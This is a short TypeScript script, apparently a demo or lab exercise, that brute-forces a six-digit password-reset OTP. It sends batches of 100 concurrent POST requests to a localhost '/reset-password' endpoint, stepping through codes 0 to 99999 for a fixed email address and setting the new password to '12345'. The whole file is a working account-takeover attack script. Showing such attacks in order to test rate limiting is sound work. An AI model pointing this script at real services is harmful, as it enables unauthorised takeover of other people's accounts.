import axios from 'axios';

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "var89@gmail.com",
        "otp": otp,
        "newPassword": "12345"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
         await axios.request(config);
        // console.log(JSON.stringify(response.data));
    } catch (error) {
        // console.log(error);
    }
}

// sendRequest("264291");
async function main (){
    for(let i = 0; i<= 99999;i+=100){
        const p = []
        console.log(i);
        // promise
        for ( let j = 0; j<100;j++){
            p.push(sendRequest((i+j).toString()));
        }
        await Promise.all(p);
    }
    
}
main();
